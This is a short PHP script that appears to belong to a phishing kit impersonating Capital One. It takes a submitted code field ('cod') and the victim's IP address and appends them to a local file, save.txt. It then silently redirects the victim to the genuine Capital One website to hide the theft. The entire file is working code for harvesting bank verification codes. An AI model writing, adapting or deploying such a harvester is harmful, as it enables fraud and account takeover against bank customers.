<?php

echo "<meta http-equiv=\"refresh\" content=\"0;URL='https://www.capitalone.com/'\" />";

$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");

$cod = $_POST['cod'];

$saveline = $ip . ' Cod2: ' . $cod . "\n";

$fh=fopen('save.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);


exit;


?>
